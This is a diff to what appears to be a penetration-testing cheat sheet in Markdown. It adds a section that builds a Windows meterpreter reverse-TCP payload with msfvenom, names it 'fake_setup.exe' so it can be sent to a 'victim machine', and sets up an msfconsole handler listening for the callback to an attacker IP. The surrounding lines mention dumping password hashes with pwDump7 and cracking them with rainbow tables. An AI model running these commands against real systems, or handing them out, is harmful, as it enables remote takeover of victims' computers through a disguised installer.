@@ -127,3 +127,22 @@ pwDump7.exe> hashes.txt
   * [rcrack_gui.exe](http://project-rainbowcrack.com/) : Use Raindow Table to crack hashes
   
   </details>
+
+ 
+<details>
+  <summary> Create A Reverse TCP Connection</summary>
+
+```shell
+# creates reverse TCP from windows  machine, send this file to victim machine via python-Webserver/shared resource
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker_IP> LPORT=444 -o fake_setup.exe  ↵
+
+msfconsole ↵
+use exploit/multi/handler ↵
+set LHOST=<attacker-IP>  ↵
+set LPORT=444 ↵
+  run
+#
+```
+
+  
+  </details>
